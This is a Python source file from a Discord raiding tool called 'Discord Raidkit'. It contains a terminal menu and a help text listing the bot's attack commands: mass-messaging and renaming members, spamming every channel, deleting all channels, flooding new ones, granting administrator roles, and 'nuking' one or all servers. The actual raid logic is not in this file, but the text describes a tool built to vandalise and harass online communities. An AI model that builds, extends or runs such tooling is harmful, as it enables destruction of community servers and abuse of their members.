import pathlib as pl

import colorama as cama

import conf.config as conf
import shared.shared as shared
import utils.dr_repo_utils as ru
import utils.io_utils as iou


def main_menu(config_file_path: pl.Path = pl.Path(conf.DEF_CONFIG_FILE_PATH)) -> int:
    """Allows the user to select an option to use:
    
    Anubis: 1
    Qetesh: 2
    Osiris: 3
    Edit bot config: 4
    Exit: 5"""
    menu_str = f"""{cama.Fore.LIGHTGREEN_EX}Discord Raidit {ru.MY_VERSION}

{cama.Fore.LIGHTBLUE_EX}[1] Anubis
{cama.Fore.LIGHTRED_EX}[2] Qetesh
{cama.Fore.LIGHTYELLOW_EX}[3] Osiris"""
    menu_str = menu_str + f"{cama.Fore.MAGENTA}" if config_file_path.exists() else menu_str + f"{cama.Fore.LIGHTBLACK_EX}"
    menu_str = menu_str + f"""
[4] Edit bot config
{cama.Fore.RED}[5] Exit

{cama.Fore.LIGHTGREEN_EX}>>> {cama.Fore.LIGHTWHITE_EX}"""
    return iou.valid_input(menu_str, [1, 2, 3, 4, 5], int, True)


def raider_cmds(prefix: str, bot_type: shared.BotType) -> str:
    """Return a string to display when the bot is ready.
    """
    return f"""{cama.Fore.LIGHTGREEN_EX}Welcome to Discord Raidkit's raiding utility {cama.Fore.LIGHTWHITE_EX}{ru.MY_VERSION}{cama.Fore.LIGHTGREEN_EX}!

{cama.Fore.LIGHTWHITE_EX}Bot Type: {cama.Fore.LIGHTMAGENTA_EX}{bot_type}

{cama.Fore.LIGHTBLUE_EX}{prefix}nick_all <nickname> {cama.Fore.LIGHTWHITE_EX}- {cama.Fore.LIGHTYELLOW_EX}changes the nickname of all members in the server.
{cama.Fore.LIGHTBLUE_EX}{prefix}msg_all <message> {cama.Fore.LIGHTWHITE_EX}- {cama.Fore.LIGHTYELLOW_EX}sends a message to all members in the server.
{cama.Fore.LIGHTBLUE_EX}{prefix}spam <message> {cama.Fore.LIGHTWHITE_EX}- {cama.Fore.LIGHTYELLOW_EX}spams a message in all channels in the server.
{cama.Fore.LIGHTBLUE_EX}{prefix}cpurge {cama.Fore.LIGHTWHITE_EX}- {cama.Fore.LIGHTYELLOW_EX}deletes all channels in the server.
{cama.Fore.LIGHTBLUE_EX}{prefix}cflood <amount> <name> {cama.Fore.LIGHTWHITE_EX}- {cama.Fore.LIGHTYELLOW_EX}creates a specified amount of channels with a specified name.
{cama.Fore.LIGHTBLUE_EX}{prefix}raid <role_name> <nickname> <amount> <name> <message> {cama.Fore.LIGHTWHITE_EX}- {cama.Fore.LIGHTYELLOW_EX}role and nick all users in a server, then run cflood and spam
{cama.Fore.LIGHTBLUE_EX}{prefix}admin <member> <role_name> {cama.Fore.LIGHTWHITE_EX}- {cama.Fore.LIGHTYELLOW_EX}give a member a new role with administrator permissions.
{cama.Fore.LIGHTBLUE_EX}{prefix}nuke {cama.Fore.LIGHTWHITE_EX}- {cama.Fore.LIGHTYELLOW_EX}completely nuke a server.
{cama.Fore.LIGHTBLUE_EX}{prefix}mass_nuke {cama.Fore.LIGHTWHITE_EX}- {cama.Fore.LIGHTYELLOW_EX}completely nuke all servers the bot is in.
{cama.Fore.LIGHTBLUE_EX}{prefix}leave <server_id> {cama.Fore.LIGHTWHITE_EX}- {cama.Fore.LIGHTYELLOW_EX}leave a server.
{cama.Fore.LIGHTBLUE_EX}{prefix}mass_leave {cama.Fore.LIGHTWHITE_EX}- {cama.Fore.LIGHTYELLOW_EX}leave all servers the bot is in.
{cama.Fore.LIGHTBLUE_EX}{prefix}close {cama.Fore.LIGHTWHITE_EX}- {cama.Fore.LIGHTYELLOW_EX}close the bot. {cama.Fore.RED}Use this over CTRL + C!

{cama.Fore.RED}Warning {cama.Fore.LIGHTWHITE_EX}: {cama.Fore.LIGHTRED_EX}make sure your bot's role is higher than the roles of those you wish to affect.

{cama.Fore.LIGHTWHITE_EX}"""
